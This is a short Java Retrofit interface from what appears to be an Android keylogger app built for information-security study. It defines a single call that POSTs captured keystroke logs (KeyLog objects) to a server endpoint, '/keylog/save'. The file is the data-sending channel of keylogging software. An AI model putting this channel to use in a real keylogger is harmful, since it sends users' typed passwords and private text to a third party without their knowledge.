package com.maemresen.infsec.keylogapp.retrofit;

import com.maemresen.infsec.keylogapp.model.KeyLog;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;

public interface ApiInterface {
    @POST("/keylog/save")
    Call<String> sendData(@Body KeyLog keyLog);

}
